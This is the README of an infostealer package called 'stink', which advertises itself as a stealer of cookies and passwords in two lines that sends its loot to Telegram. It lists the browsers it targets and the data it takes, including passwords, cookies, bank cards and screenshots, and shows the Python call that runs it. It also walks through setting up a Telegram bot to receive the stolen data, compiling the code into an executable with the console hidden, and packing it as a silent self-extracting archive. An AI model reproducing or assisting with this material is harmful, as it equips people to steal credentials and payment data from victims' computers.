<div align="left">
 <img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/FallenAstaroth/stink">
 <img alt="PyPI - Python Version" src="https://img.shields.io/pypi/pyversions/stink">
 <img alt="GitHub" src="https://img.shields.io/github/license/FallenAstaroth/stink">
</div>

# stink

Cookies and passwords stealer in just 2 lines. Sending to Telegram.

## Description
`stink` is just starting its development. Its functionality will be expanded in the future.

## Navigation
* [Current features](#Сurrent-features)
* [Future features](#Future-features)
* [Installation](#Installation)
* [Example usage](#Example-usage)
  * [Standard](#Standard)
  * [Additional parameters](#Additional-parameters)
* [Telegram bot setup](#Telegram-bot-setup)
  * [Getting token](#Getting-token)
  * [Getting id](#Getting-id)
* [Creating exe](#Creating-exe)
  * [Creating executable file](#Creating-executable-file)
  * [CMD](#CMD)
* [Сompression exe](#Сompression-exe)
  * [Disadvantages](#Disadvantages)
  * [WinRAR](#WinRAR)

### Current features
1. Support for the following browsers:
   - Chrome
   - Opera
   - Opera GX
   - Microsoft Edge
   - Brave
2. Collecting the following data:
   - Screenshot.
   - Cookies.
   - Passwords.
   - Bank cards.
   - IP-address.
   - System configuration.
   - Active processes.
3. Sending an archive of collected data to Telegram.
4. Execution in a separate thread.

### Future features
1. Support for other browsers.
2. Other features.
 
## Installation

You can install the latest version with the command:
```
pip install stink==1.0.0
```

## Example usage
### Standard
```python
from stink.multistealer import Stealer

Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```
### Additional parameters

- `errors` - error output.

- `passwords` - collecting passwords.

- `cookies` - collecting cookies.

- `cards` - collecting of bank cards.

- `processes` - collecting of active processes.

- `system` - collecting system configuration.

- `screen` - screenshot.

All parameters take the value of `bool`. 

- `True` - the function is enabled.

- `False` - the function is disabled.

All functions are enabled by default, except for error output.

## Telegram bot setup
### Getting token
1. Open a chat with [BotFather](https://t.me/botfather).
2. Write the command ```/newbot```.

<p align="left">
  <a href="">
    <img src="_1.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Write the name of the bot, then the nickname with the attribute ```_bot``` at the end.

<p align="left">
  <a href="">
    <img src="_2.png" width="500px" style="display: inline-block;">
  </a>
</p>

4. Insert the resulting token into the ```YOUR_TOKEN``` field in the script.

### Getting id
1. Open a chat with [Get My ID](https://t.me/getmyid_bot).
2. Write the command ```/start```.

<p align="left">
  <a href="">
    <img src="_3.png" width="500px" style="display: inline-block;">
  </a>
</p>

3. Insert the resulting ID into the ```YOUR_ID``` field in the script.

## Creating exe
Python is an interpreted programming language, so we first translate it into C++ and then compile it into an .exe file.
We will need Nuitka to do this.

### Creating executable file

Create a test.py (or any other name) file with the following code:
```python
from stink.multistealer import Stealer

Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
```

### CMD
1. Open `cmd`.
2. Type in the command:
```
pip install virtualenv
```
3. Go to the folder with the `test.py` file:
```
cd path\to\file
```
4. Create a virtual environment and activate it:
```
virtualenv venv
```
```
venv\Scripts\activate
```
5. Install Nuitka and Stink:
```
pip install Nuitka==0.6.16.4
```
```
pip install stink==1.0.0
```
6. In the appearing folder venv go to the path `\Lib\site-packages\win32\`.
7. Copy the file `win32crypt.pyd`.
8. Paste it in the path `\Lib\site-packages\`.
9. Go back to `cmd` and write the command:
```
nuitka --onefile --windows-disable-console --include-package=stink test.py
```

After executing the command we get the test.exe file with the hidden console.

## Сompression exe
File `.exe` is too big, so we will compress it with WinRAR, but it will still be in the `.exe` format.

#### Disadvantages
- Can be detected by various anti-viruses.
- Longer program startup time.

### WinRAR
1. Download and install [WinRAR](https://www.win-rar.com/start.html?&L=4)
2. Right-click `.exe` file and select `Add to archive...`.
3. Select the `RAR` archive format, `Maximum` compression method, and `32 MB` Dictionary size and click `Create SFX archive`.
4. Go to the tab `Advanced` and select `SFX options`.
5. Go to the tab `Install` and enter the name of your file (for example `test.exe`) into the field `Execute after unpacking`.
6. Go to the tab `Modes` and click `Unpack to Timas folder` and select `Dump everything` in the section `Information output mode`.
7. Go to the tab `Update` and select `Overwrite all files without request` in the section `Overwrite mode`.
8. Change the icon and logo if you want in the tab `Text and Graphics`.
9. Press `OK`.

As a result we get `.exe` file reduced several times:
```
        File size              Ratio
------------------------    -----------
48 091 KB  ->  15 239 KB       68.3%
```
